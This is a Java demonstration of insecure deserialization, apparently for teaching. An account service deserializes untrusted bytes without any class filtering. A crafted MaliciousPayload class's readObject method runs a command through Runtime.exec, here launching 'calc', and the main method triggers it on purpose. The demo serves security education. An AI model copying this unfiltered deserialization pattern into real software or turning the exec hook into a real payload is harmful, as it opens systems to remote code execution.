import java.io.*;
import java.util.*;

class UserAccount implements Serializable {
    private String accountNumber;
    private double balance;

    public UserAccount(String accountNumber, double balance) {
        this.accountNumber = accountNumber;
        this.balance = balance;
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // 模拟业务逻辑中的敏感操作
        if (balance < 0) {
            throw new SecurityException("Invalid account balance");
        }
    }

    @Override
    public String toString() {
        return "Account[" + accountNumber + ", $" + balance + "]";
    }
}

class AccountService {
    public UserAccount deserializeAccount(byte[] data) throws IOException, ClassNotFoundException {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
            // 不安全的反序列化操作
            return (UserAccount) ois.readObject();
        }
    }

    public byte[] serializeAccount(UserAccount account) throws IOException {
        try (ByteArrayOutputStream bos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(account);
            return bos.toByteArray();
        }
    }
}

// 模拟攻击者构造的恶意类
class MaliciousPayload implements Serializable {
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        // 恶意代码执行
        Runtime.getRuntime().exec("calc"); // 模拟命令执行
    }
}

public class Main {
    public static void main(String[] args) throws Exception {
        AccountService service = new AccountService();
        
        // 正常用户账户序列化
        UserAccount normalAccount = new UserAccount("1234567890", 1000.0);
        byte[] serializedData = service.serializeAccount(normalAccount);
        
        // 攻击者构造恶意数据
        ByteArrayOutputStream malicousStream = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(malicousStream)) {
            oos.writeObject(new MaliciousPayload());
        }
        
        // 模拟漏洞触发
        System.out.println("[+] Deserializing normal account:");
        System.out.println(service.deserializeAccount(serializedData));
        
        System.out.println("\
[!] Attempting malicious deserialization:");
        service.deserializeAccount(malicousStream.toByteArray()); // 触发漏洞
    }
}